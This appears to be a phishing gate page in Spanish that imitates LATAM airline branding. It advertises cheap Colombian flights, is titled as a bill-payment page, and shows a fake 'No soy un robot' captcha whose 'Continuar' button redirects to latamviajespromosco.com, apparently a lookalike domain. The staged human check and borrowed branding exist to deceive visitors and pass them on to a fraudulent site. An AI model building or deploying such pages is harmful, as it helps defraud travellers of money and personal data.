
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="description" content="Explora la riqueza de Colombia y descubre lo mejor de Medellín, Bogotá, Cartagena, Santa Marta, Bucaramanga y San Andrés.">
  <meta name="keywords" content="tiquetes baratos, vuelos baratos, viajes baratos, ofertas viajes, buscar vuelos, viajes colombia, viajes a medellin, viajes a bogota, vuelos a medellin, vuelos a bogota, vuelos a cartagena, vuelos a santa marta, vuelos a bucaramanga, vuelos a san andres">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Paga tus factura online</title>
  <link rel="preconnect" href="https://fonts.googleapis.com/">
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      line-height: 1.6;
    }
    header {
      background: #3f1d7a; /* morado LATAM */
      color: #fff;
      padding: 20px;
      text-align: center;
    }
    nav {
      background: #2b0a5f; /* azul oscuro LATAM */
      padding: 10px;
      text-align: center;
    }
    nav a {
      color: #fff;
      margin: 0 15px;
      text-decoration: none;
    }
    main {
      padding: 20px;
    }
    section {
      margin-bottom: 40px;
    }
    h2 {
      border-bottom: 2px solid #ccc;
      padding-bottom: 10px;
    }
    .city {
      background: #f4f4f4;
      padding: 20px;
      margin-bottom: 20px;
    }
    .city h3 {
      margin-top: 0;
    }
    .contact-form {
      background: #e9ecef;
      padding: 20px;
      max-width: 600px;
      margin: 0 auto;
    }
    .contact-form label {
      display: block;
      margin-bottom: 5px;
    }
    .contact-form input,
    .contact-form textarea {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
    }
    .contact-form button {
      background: #3f1d7a;
      color: #fff;
      padding: 10px 20px;
      border: none;
      cursor: pointer;
    }
    footer {
      background: #2b0a5f;
      color: #fff;
      text-align: center;
      padding: 10px;
    }
    .politicas {
      background: #f9f9f9;
      padding: 20px;
      margin-bottom: 20px;
    }
    .politicas h3 {
      margin-top: 0;
    }
    #captchaOverlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(211, 211, 211, 0.8);
      z-index: 9999;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: white;
      border-radius: 10px;
      box-shadow: 0 3px 10px rgba(0,0,0,0.3);
      padding: 20px;
      width: 100%;
      max-width: 350px;
      text-align: center;
      font-family: 'Roboto', sans-serif;
    }
    .container h1 {
      font-size: 20px;
      color: #333;
      margin-bottom: 10px;
    }
    .captchat {
      position: relative;
      margin-top: 15px;
      border: 2px solid transparent;
      border-radius: 6px;
      overflow: hidden;
    }
    .captchat img {
      width: 100%;
      height: auto;
      display: block;
    }
    .draggable {
      width: 22px;
      height: 23px;
      background-color: transparent;
      position: absolute;
      top: 30px;
      left: 40px;
      cursor: pointer;
      border: 2px solid transparent;
      border-radius: 4px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.3);
    }
    .draggable.checked::after {
      content: "✓";
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      color: #1d04e1;
      font-size: 14px;
      font-weight: bold;
    }
    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #b40054; /* fucsia LATAM */
      border-radius: 50%;
      width: 24px;
      height: 24px;
      animation: spin 1s linear infinite;
      margin: 15px auto;
      display: none;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    #continueBtn {
      margin: 15px auto 0;
      padding: 10px 20px;
      font-size: 16px;
      font-weight: bold;
      color: #fff;
      background: linear-gradient(45deg, #3f1d7a, #b40054); /* Morado a fucsia LATAM */
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: transform 0.2s, box-shadow 0.2s;
      display: none;
    }
    #continueBtn:hover {
      transform: scale(1.05);
      box-shadow: 0 3px 8px rgba(191, 0, 84, 0.4);
    }
  </style>
</head>
<body>


<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17077609285"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'AW-17077609285');
</script>

  <div id="captchaOverlay">
    <div class="container">
      <h1>No soy un robot</h1>
      <div class="captchat">
        <img src="cap.jpg" alt="Imagen de Captchat">
        <div class="draggable" id="check"></div>
      </div>
      <div class="loader" id="loader"></div>
      <button id="continueBtn">Continuar</button>
    </div>
  </div>

  <!-- Aquí comienza el contenido existente del sitio -->
  <!-- ...NO MODIFICADO: contenido de ciudades, políticas, contacto, etc... -->

  <script>
    const check = document.getElementById('check');
    const loader = document.getElementById('loader');
    const continueBtn = document.getElementById('continueBtn');

    check.addEventListener('click', () => {
      check.classList.toggle('checked');
      if (check.classList.contains('checked')) {
        continueBtn.style.display = 'none';
        loader.style.display = 'block';
        setTimeout(() => {
          loader.style.display = 'none';
          continueBtn.style.display = 'block';
        }, 2000);
      } else {
        loader.style.display = 'none';
        continueBtn.style.display = 'none';
      }
    });

    continueBtn.addEventListener('click', () => {
      document.getElementById('captchaOverlay').style.display = 'none';
      window.location.href = "https://latamviajespromosco.com/travel-web-nacionales-co";
    });
  </script>
</body>
</html>
